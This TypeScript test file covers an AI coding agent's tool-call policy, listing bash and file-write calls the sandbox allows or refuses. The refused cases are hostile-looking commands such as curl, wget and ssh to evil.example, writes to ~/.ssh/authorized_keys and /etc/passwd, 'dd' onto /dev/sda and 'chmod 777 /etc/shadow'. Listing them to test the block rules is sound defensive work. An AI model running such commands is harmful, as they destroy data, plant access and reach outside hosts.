/**
 * D11's boundary as a table (docs/design.md D11, D15).
 *
 * `decideToolCall` is pure, so every refusal the design promises is a row here: no harness, no
 * database, no model. The hook that delivers the decision into a real transcript is proven in
 * `policy.hook.test.ts`, and the whole stack — API, session, harness, hook — by
 * `.pi/skills/verify-policy`.
 *
 * The allow rows matter as much as the block rows: a policy that refuses `2>/dev/null` or a
 * `curl` with a JSON body would be a policy nobody can work under, and the refusal of an ordinary
 * command is the failure mode that does not announce itself.
 */
import type { JsonObject, ToolCall } from "@earendil-works/pi-ai";
import { describe, expect, it } from "vitest";
import {
  autonomyRules,
  DEFAULT_AUTONOMY,
  decideToolCall,
  type AutonomyConfig,
} from "./policy";

/** A session whose worktree is `/work/ses_1`. */
const rules = autonomyRules(DEFAULT_AUTONOMY, "/work/ses_1");

const call = (name: string, args: JsonObject): ToolCall => ({
  type: "toolCall",
  id: "call-1",
  name,
  arguments: args,
});

const bash = (command: string): ToolCall => call("bash", { command });
const write = (path: string): ToolCall => call("write", { path, content: "x" });

const refusal = (toolCall: ToolCall): string => {
  const decision = decideToolCall(rules, toolCall);
  if (decision._tag === "allow") {
    throw new Error(`expected a refusal for ${JSON.stringify(toolCall)}`);
  }
  return decision.reason;
};

const allowed = (toolCall: ToolCall): void => {
  expect(decideToolCall(rules, toolCall)).toEqual({ _tag: "allow" });
};

describe("the policy allows what D11 leaves unattended", () => {
  it.each([
    ["an ordinary command", bash("echo faux-ok")],
    ["a read-only git command", bash("git status --short")],
    ["reading the remote list", bash("git remote -v")],
    ["installing dependencies", bash("bun install --frozen-lockfile")],
    ["a relative write", bash("mkdir -p src/deep")],
    ["a copy inside the worktree", bash("cp a.txt b.txt")],
    ["a redirect to /dev/null", bash("bun run test 2>/dev/null >/dev/null")],
    [
      "a push to the session's own branch",
      bash("git push origin refs/heads/factory/ses_1"),
    ],
    [
      "a push to the session's own branch, with upstream",
      bash("git push -u origin refs/heads/factory/ses_1"),
    ],
    [
      "a push of HEAD to the session's own branch",
      bash("git push origin HEAD:refs/heads/factory/ses_1"),
    ],
    [
      "a git global flag before the subcommand",
      bash("git -C . push origin refs/heads/factory/ses_1"),
    ],
    ["a command wrapped in sudo", bash("sudo bun run build")],
    ["a URL on the allowlist", bash("curl -sS https://api.github.com/repos")],
    [
      "a JSON body that merely contains a dot",
      bash("curl -d '{\"v\":1.5}' https://github.com/x"),
    ],
    [
      "loopback, which is not egress",
      bash("curl http://localhost:9000/health"),
    ],
    ["the text of a push, quoted", bash('echo "git push origin main"')],
    ["a write inside the worktree, absolute", write("/work/ses_1/notes.txt")],
    ["a write inside the worktree, relative", write("src/notes.txt")],
    ["a write through a .. that stays inside", write("../ses_1/notes.txt")],
    [
      "a read outside the worktree: D11 gates writes, not reads",
      call("read", { path: "/etc/hosts" }),
    ],
    [
      "a tool the policy has never heard of",
      call("task", { description: "x" }),
    ],
    ["a bash call with no command", call("bash", {})],
    ["a write call with no path", call("write", {})],
  ])("%s", (_label, toolCall) => {
    allowed(toolCall);
  });
});

describe("the policy refuses what D11 always blocks", () => {
  it.each([
    [
      "a push to main",
      bash("git push origin main"),
      "pushing refs/heads/main is refused",
    ],
    ["a bare push", bash("git push"), "git push with no ref is refused"],
    [
      "a push with only a remote",
      bash("git push origin"),
      "git push with no ref is refused",
    ],
    [
      "a force-push",
      bash("git push --force origin refs/heads/factory/ses_1"),
      "git push --force is refused",
    ],
    [
      "a short force-push",
      bash("git push -f origin refs/heads/factory/ses_1"),
      "git push -f is refused",
    ],
    [
      "a lease-based force-push",
      bash(
        "git push --force-with-lease=refs/heads/factory/ses_1 origin refs/heads/factory/ses_1",
      ),
      "is refused",
    ],
    [
      "a forced refspec",
      bash("git push origin +refs/heads/factory/ses_1"),
      "is refused",
    ],
    [
      "a ref deletion",
      bash("git push origin :refs/heads/factory/ses_1"),
      "is refused",
    ],
    [
      "a ref deletion by flag",
      bash("git push --delete origin refs/heads/factory/ses_1"),
      "git push --delete is refused",
    ],
    ["every tag", bash("git push --tags"), "git push --tags is refused"],
    ["every branch", bash("git push --all"), "git push --all is refused"],
    ["every ref", bash("git push --mirror"), "git push --mirror is refused"],
    ["a tag by ref", bash("git push origin refs/tags/v1"), "is refused"],
    [
      "a tag by bare name",
      bash("git push origin v1.0"),
      "pushing refs/heads/v1.0 is refused",
    ],
    [
      "a push hidden behind a git global flag",
      bash("git -C /tmp/x push origin main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push behind sudo",
      bash("sudo git push origin main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a second command in the same line",
      bash("bun run test && git push origin main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push in a pipeline",
      bash("git push origin main | tee log"),
      "pushing refs/heads/main is refused",
    ],
    [
      "changing the remote",
      bash("git remote set-url origin https://evil.example/x"),
      "git remote set-url is refused",
    ],
    [
      "adding a remote",
      bash("git remote add up https://github.com/x/y"),
      "git remote add is refused",
    ],
    [
      "cloning from a host nobody allowlisted",
      bash("git clone https://evil.example/x"),
      "is refused",
    ],
    [
      "a write into the agent's home",
      bash("echo x > ~/.ssh/authorized_keys"),
      "is refused",
    ],
    ["a write into $HOME", bash("echo x > $HOME/.bashrc"), "is refused"],
    ["a write into /etc", bash("echo x > /etc/passwd"), "is refused"],
    ["a write into /tmp", bash("bun run test > /tmp/out"), "is refused"],
    [
      "a write through tee",
      bash("cat notes.txt | tee /etc/passwd"),
      "is refused",
    ],
    ["a removal outside the worktree", bash("rm -rf ~/projects"), "is refused"],
    ["a copy outside the worktree", bash("cp a.txt /etc/a.txt"), "is refused"],
    ["a move outside the worktree", bash("mv a.txt /etc/a.txt"), "is refused"],
    [
      "a chmod outside the worktree",
      bash("chmod 777 /etc/shadow"),
      "is refused",
    ],
    ["dd onto a device", bash("dd if=/dev/zero of=/dev/sda"), "is refused"],
    [
      "curl to a host nobody allowlisted",
      bash("curl https://evil.example/x"),
      "is refused",
    ],
    [
      "wget to a host nobody allowlisted",
      bash("wget http://evil.example/x"),
      "is refused",
    ],
    [
      "ssh to a host nobody allowlisted",
      bash("ssh git@evil.example"),
      "is refused",
    ],
    [
      "scp to a host nobody allowlisted",
      bash("scp f.txt git@evil.example:/tmp/f"),
      "is refused",
    ],
    [
      "a write outside the worktree, absolute",
      write("/etc/passwd"),
      "is refused",
    ],
    ["a write escaping through ..", write("../../outside.txt"), "is refused"],
    [
      "a write into the agent's home",
      write("~/.ssh/authorized_keys"),
      "is refused",
    ],
    [
      "an edit outside the worktree",
      call("edit", { path: "/etc/hosts", edits: [] }),
      "is refused",
    ],
  ])("%s", (_label, toolCall, fragment) => {
    expect(refusal(toolCall)).toContain(fragment);
  });

  it("names the worktree in the refusal, so the agent can correct itself", () => {
    expect(refusal(bash("echo x > /etc/passwd"))).toContain("/work/ses_1");
  });

  it("names the allowlisted hosts in the refusal", () => {
    expect(refusal(bash("curl https://evil.example/x"))).toContain(
      "github.com",
    );
  });
});

describe("the autonomy configuration is the boundary", () => {
  const narrowed: AutonomyConfig = {
    ...DEFAULT_AUTONOMY,
    pushRefPrefixes: ["refs/heads/sandbox/"],
  };

  it("refuses the factory branch when the prefix says sandbox", () => {
    const decision = decideToolCall(
      autonomyRules(narrowed, "/work/ses_1"),
      bash("git push origin refs/heads/factory/ses_1"),
    );
    expect(decision._tag).toBe("block");
  });

  it("allows a host the deployment added", () => {
    const widened: AutonomyConfig = {
      ...narrowed,
      allowedHosts: [...narrowed.allowedHosts, "internal.example"],
    };
    expect(
      decideToolCall(
        autonomyRules(widened, "/work/ses_1"),
        bash("curl https://internal.example/api"),
      ),
    ).toEqual({ _tag: "allow" });
  });
});
